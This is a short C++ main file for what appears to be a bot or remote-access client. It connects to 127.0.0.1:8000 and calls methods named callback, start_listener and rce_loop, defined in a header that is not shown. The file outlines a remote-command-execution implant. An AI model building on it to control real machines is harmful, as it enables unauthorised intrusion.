#include <arpa/inet.h>
#include <bot.hpp>
#include <netinet/in.h>
#include <iostream>
#include <sys/socket.h>

int main() {
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8000);
    inet_aton("127.0.0.1", &addr.sin_addr);
    int res;
    auto b = Bot(&addr);

    res = b.callback();
    b.start_listener();
    b.rce_loop();
    b.stop_listener();
    return 0;
}